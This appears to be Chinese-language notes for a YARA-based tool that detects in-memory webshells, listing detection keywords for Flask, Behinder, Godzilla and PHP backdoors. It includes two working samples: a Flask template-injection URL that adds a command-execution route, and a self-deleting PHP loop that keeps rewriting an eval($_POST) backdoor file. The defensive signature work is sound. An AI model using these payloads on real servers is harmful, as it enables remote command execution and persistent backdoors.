linux系统运行需要安装yara
sudo apt-get install yara

windows系统无需安装，调用yara_engine目录下的引擎

安装模块：tqdm、sys、os、time、psutil


python内存马
http://192.168.1.116:5000/test?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.values.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
http://192.168.1.116:5000/shell1?cmd=whoami


特征：
_request_ctx_stack
add_url_rule
exec
eval




Behinder内存马
特征：
ProcessBuilder
Runtime
Instrument
Agent Injected Successfully
HttpSessionBindingListener
reflect/Constructor


Godzilla内存马
特征：
/favicon.ico
com/sun/jna/platform/win32/COM/COMInvoker.class
/sun/jna/platform/godzilla

x/AES_BASE64
x/AES_RAW
/favicon.ico



php不死马
新建文件22.php

<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
$content = '<?php @eval($_POST["zzz"]) ?>';
file_put_contents("22.php", $content);
usleep(10000);
}
?>

特征：
ignore_user_abort
set_time_limit
unlink
file_put_contents
usleep